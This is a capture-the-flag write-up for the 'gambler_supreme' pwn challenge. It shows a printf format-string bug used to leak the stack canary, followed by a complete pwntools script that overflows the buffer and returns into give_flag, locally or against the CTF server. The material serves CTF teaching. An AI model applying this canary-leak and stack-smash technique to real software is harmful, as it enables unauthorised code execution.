## Question 

The Casino, but with a cool new feature! 

You must create a flag.txt in the same folder as the binary for it to run. 

nc ctf.b01lers.com 9201 

Author: robotearthpizza 

Difficulty: Hard 

[gambler_supreme](gambler_supreme)

## Solution

The binary has NX, Stack, Canaries, and Full RELRO enabled. 

```
$ pwn checksec ./gambler_supreme'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We see that the binary calls printf() on user-specified input without a format specifier. 

```
004016c7          printf("Your guess: ");
004016d8          printf(&var_38);
004016e2          putchar(0xa);
```

This allows us to leak the canary. On quick check, we can identify that it is at offset 13.

```
$ python3 pwn-gamblers_supreme.py BIN=./gambler_supreme LEAK | grep 00
    PIE:      No PIE (0x400000)
b'%13$p' b' 0xbfcd82868a531500\n'
b'%19$p' b' 0x1e7963000\n'
b'%28$p' b' 0x44009a0ed828d773\n'

$ gdb ./gambler_supreme 

pwndbg> r
Guess me a string of length 7 with lowercase letters: %13$p
Your guess: 0xd3813a8e16bdf900

pwndbg> canary
Canary    = 0xd3813a8e16bdf900 (may be incorrect on != glibc)
```

The binary also suffers from a buffer overflow. To succesfully exploit, we can cause the buffer overflow, overwrite the canary, and redirect return address to the ```give_flag``` function.

```python
from pwn import *
import sys

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def find_canary():
    print("LEAK")
    for i in range(50):
        p = process(args.BIN, level="error")
        p.recvuntil(b'Enter a difficulty between 1 and 7 (inclusive): ')
        p.sendline(b'7')
        p.recvuntil(b'Guess me a string of length 7 with lowercase letters:')
        leak = b'%%%i$p' % i
        p.sendline(leak)
        p.recvuntil(b'Your guess:')
        print(leak, p.recvline())
        p.close()


def start():
    if args.LEAK:
        find_canary()
        sys.exit(0)

    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('ctf.b01lers.com', 9201)
    else:
        return process(e.path)


p = start()


def setup():
    p.recvuntil(b'Enter a difficulty between 1 and 7 (inclusive)')
    p.sendline(b'7')


def leak_canary():
    p.recvuntil(b'Guess me a string of length 7 with lowercase letters')
    p.sendline(b'%13$p')
    p.recvuntil(b'Your guess:')
    canary = int(p.recvline().strip(b'\n'), 16)
    return canary


def smash_stack(canary):
    p.recvline(b'Guess me a string of length 7 with lowercase letters:')
    pad = cyclic(40)
    chain = p64(canary)
    chain += p64(0xdeadbeef)
    chain += p64(e.sym['give_flag'])
    p.sendline(pad+chain)


setup()
canary = leak_canary()
smash_stack(canary)

p.interactive()
```
